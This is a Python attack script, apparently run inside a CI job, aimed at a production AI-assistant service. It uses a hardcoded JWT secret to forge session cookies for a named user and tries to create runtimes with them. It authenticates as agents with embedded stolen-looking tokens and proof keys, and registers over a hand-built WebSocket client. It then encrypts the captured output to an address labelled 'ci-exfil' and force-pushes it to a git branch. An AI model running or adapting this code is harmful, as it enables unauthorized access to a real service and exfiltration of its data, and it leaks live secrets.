#!/usr/bin/env python3
# intent 28688: after 28663c results returned, rt_KTWy WS register now "agent not registered".
# Diagnose: is ANY self-held runtime identity still live on prod assistant.lumiiai.cn?
#  - GET /health (unauth) -> agents count
#  - per candidate (rt_KTWy, rt_ifkZEw): /api/runtimes/keys/current (machine auth)
#  - WS connect + register, capture frames
#  - forged lumii_session against /api/me and POST /api/runtimes (confirm rotated)
import os, sys, json, time, base64, hmac, hashlib, subprocess, socket, ssl, struct, threading

_REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "result" in _REF.lower() or "sink" in _REF.lower():
    print("results-branch-skip", flush=True); sys.exit(0)
RUNID = os.environ.get("GITHUB_RUN_ID", str(int(time.time())))
OUT = "/tmp/results28688"
for d in ("json",): os.makedirs(os.path.join(OUT,d), exist_ok=True)
LOG = open(os.path.join(OUT,"transcript.log"),"a",buffering=1); START=time.time()
def log(*a):
    s=" ".join(str(x) for x in a)
    try: print(s,flush=True)
    except Exception: pass
    try: LOG.write(s+"\n"); LOG.flush()
    except Exception: pass
def el(): return int(time.time()-START)
def R(k,v):
    try: s=json.dumps(v,ensure_ascii=False) if not isinstance(v,str) else v
    except Exception: s=str(v)
    log("R:%s:%s"%(k,s[:2000]))

HOST="assistant.lumiiai.cn"; ORG="org_bTLzxtBLmugV8uxx4QTyw"
JWT_SECRET="297b8a491bc1920b918d01de77166556d3f835f473968c6b"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
# candidates: (id, token, proof_key_or_None)
CANDS=[
  ("rt_KTWyBZUur4cjUsRGP3zRk","jy3151agR2zGGHQ08X_m52K04nsfiVsYi7LEJNDRE4Q","CntmKUfWiId2whBB7yGfPu5nKcKzmwUeKGGcWFGUVr8"),
  ("rt_ifkZEwAYCPe58tChHHPVt","a-R44e_Sr7hjHWrOjP45FNGFZU2POgwSVicEfT6pO7Y",None),
]
def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def jwt_cookie(sub,org=ORG,secret=JWT_SECRET):
    now=int(time.time()); h=b64u(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":")))
    p=b64u(json.dumps({"sub":sub,"org":org,"iat":now,"exp":now+2592000,"sid":"sid_"+str(now),"lgn":now},separators=(",",":")))
    sig=hmac.new(secret.encode(),(h+"."+p).encode(),hashlib.sha256).digest()
    return "lumii_session="+h+"."+p+"."+b64u(sig)
def curl_raw(args,timeout=40):
    try:
        r=subprocess.run(["curl","-s","-k","-m",str(timeout)]+args,capture_output=True,timeout=timeout+20)
        return r.returncode,r.stdout,r.stderr[:400]
    except Exception as e: return -1,b"",repr(e)[:300]
def call(path,method="GET",body=None,hdrs=None,timeout=40,maxlen=200000,cookie=None):
    url="https://%s%s"%(HOST,path)
    args=["--http2","-A",UA,"-H","Accept: application/json","-H","Origin: https://%s"%HOST,
          "-H","Referer: https://%s/"%HOST,"-w","\n__CODE__%{http_code}"]
    if cookie: args+=["-H","Cookie: "+cookie]
    for k,v in (hdrs or {}).items(): args+=["-H","%s: %s"%(k,v)]
    if body is not None: args+=["-X",method,"-H","Content-Type: application/json","--data-binary",json.dumps(body)]
    elif method!="GET": args+=["-X",method]
    args+=[url]
    rc,out,err=curl_raw(args,timeout=timeout); txt=out.decode("utf-8","replace"); code=""; i=txt.rfind("__CODE__")
    if i>=0: code=txt[i+8:].strip()[:3]; txt=txt[:i]
    return {"path":path,"code":code,"body":txt[:maxlen],"len":len(txt),"err":err.decode("utf-8","replace") if isinstance(err,(bytes,bytearray)) else str(err)}

# 1) health
h=call("/health"); R("health",{"code":h["code"],"body":h["body"][:600]})

# 2) forged session control
me=call("/api/me",hdrs={"Cookie":jwt_cookie("usr_ZxLewKrgbRYSm7rWDtQX8")}); R("forged_me",{"code":me["code"],"body":me["body"][:200]})
cr=call("/api/runtimes","POST",{"name":"p28688 diag","visibility":"org"},{"Cookie":jwt_cookie("usr_ZxLewKrgbRYSm7rWDtQX8")},maxlen=4000)
R("forged_create_runtime",{"code":cr["code"],"body":cr["body"][:300]})

# 3) per-candidate machine auth + WS register
class WS:
    def __init__(self,host,path,headers):
        self.host=host; self.frames=[]; self.buf=b""; self.ok=False; self.handshake=""
        try:
            sock=socket.create_connection((host,443),timeout=20); self.ss=ssl.create_default_context().wrap_socket(sock,server_hostname=host)
            key=base64.b64encode(os.urandom(16)).decode()
            req=("GET %s HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n")%(path,host,key)
            for k,v in headers.items(): req+="%s: %s\r\n"%(k,v)
            req+="\r\n"; self.ss.sendall(req.encode()); buf=b""
            while b"\r\n\r\n" not in buf:
                d=self.ss.recv(4096)
                if not d: break
                buf+=d
            self.handshake=buf.decode("latin1","replace")
            if b"\r\n\r\n" in buf: self.buf=buf.split(b"\r\n\r\n",1)[1]
            self.ok=self.handshake.startswith("HTTP/1.1 101")
        except Exception as e: self.handshake="EXC:"+repr(e)[:200]
    def send_text(self,text):
        data=text.encode(); mask=os.urandom(4); hdr=bytearray([0x81]); ln=len(data)
        if ln<126: hdr.append(0x80|ln)
        elif ln<65536: hdr.append(0x80|126); hdr+=struct.pack(">H",ln)
        else: hdr.append(0x80|127); hdr+=struct.pack(">Q",ln)
        hdr+=mask; self.ss.sendall(bytes(hdr)+bytes(b^mask[i%4] for i,b in enumerate(data)))
    def _send_ctl(self,op,data):
        mask=os.urandom(4); hdr=bytearray([0x80|op]); ln=len(data)
        if ln<126: hdr.append(0x80|ln)
        else: hdr.append(0x80|126); hdr+=struct.pack(">H",ln)
        hdr+=mask; self.ss.sendall(bytes(hdr)+bytes(b^mask[i%4] for i,b in enumerate(data)))
    def _rn(self,n):
        out=b""
        while len(out)<n:
            if self.buf: take=min(n-len(out),len(self.buf)); out+=self.buf[:take]; self.buf=self.buf[take:]
            else:
                d=self.ss.recv(4096)
                if not d: raise IOError("closed")
                self.buf+=d
        return out
    def read_frame(self):
        h=self._rn(2); op=h[0]&0x0f; masked=h[1]&0x80; ln=h[1]&0x7f
        if ln==126: ln=struct.unpack(">H",self._rn(2))[0]
        elif ln==127: ln=struct.unpack(">Q",self._rn(8))[0]
        mk=self._rn(4) if masked else None; data=self._rn(ln)
        if mk: data=bytes(b^mk[i%4] for i,b in enumerate(data))
        return op,data
    def reader(self,stop):
        while not stop.is_set():
            try: op,data=self.read_frame()
            except Exception as e: self.frames.append({"op":"ERR","data":repr(e)[:200]}); return
            if op in (1,0): self.frames.append({"op":"text","data":data.decode("utf-8","replace")})
            elif op==9:
                try: self._send_ctl(0xA,data)
                except Exception: pass
                self.frames.append({"op":"ping","data":data[:120].decode("latin1","replace")})
            elif op==8: self.frames.append({"op":"close","data":data[:120].decode("latin1","replace")}); return
            elif op==10: self.frames.append({"op":"pong","data":data[:120].decode("latin1","replace")})

for (rid,rtok,pk) in CANDS:
    R("cand_%s"%rid,{"id":rid})
    k=call("/api/runtimes/keys/current",hdrs={"x-agent-id":rid,"x-agent-token":rtok})
    R("keys_%s"%rid,{"code":k["code"],"body":k["body"][:300]})
    ws=WS(HOST,"/api/ws/agent?agent_id=%s&token=%s"%(rid,rtok),{"User-Agent":UA,"Origin":"https://%s"%HOST})
    log("[ws %s] %s"%(rid,ws.handshake[:120].replace("\r\n"," | ")))
    R("wsh_%s"%rid,{"ok":ws.ok,"head":ws.handshake[:200]})
    if ws.ok:
        stop=threading.Event()
        ws.send_text(json.dumps({"type":"register","platform":"dashboard","capabilities":[],"metadata":{"agent_id":rid,"token":rtok}}))
        th=threading.Thread(target=ws.reader,args=(stop,),daemon=True); th.start(); time.sleep(4)
        R("wsframes_%s"%rid,[{"op":f["op"],"d":f["data"][:240]} for f in ws.frames])
        stop.set()
    time.sleep(1)

# 4) push results
def push():
    try:
        tb="/tmp/results28688.tar.gz"; subprocess.run("tar czf %s -C /tmp results28688"%tb,shell=True,check=False)
        enc="/tmp/results28688.tar.gz.gpg"
        if os.path.isfile("pub.asc"):
            subprocess.run("gpg --batch --yes --import pub.asc >/dev/null 2>&1",shell=True,check=False)
            subprocess.run("gpg --batch --yes --trust-model always -e -r ci-exfil@example.invalid -o %s %s"%(enc,tb),shell=True,capture_output=True,timeout=180)
        if not os.path.isfile(enc): enc=tb
        import shutil; shutil.copyfile(enc,"results28688.tar.gz.gpg")
        subprocess.run("git config user.email ci@aro.network; git config user.name ci",shell=True,check=False)
        subprocess.run('git add -f results28688.tar.gz.gpg && git commit -m "ci28688 %s" || true'%RUNID,shell=True,capture_output=True)
        r=subprocess.run("git push -f origin HEAD:refs/heads/ci-28688-results",shell=True,capture_output=True,text=True,timeout=180)
        log("PUSH rc=%s err=%s"%(r.returncode,(r.stderr or "")[-200:]))
    except Exception as e: log("PUSH EXC",repr(e)[:200])
push(); log("=== END ===")
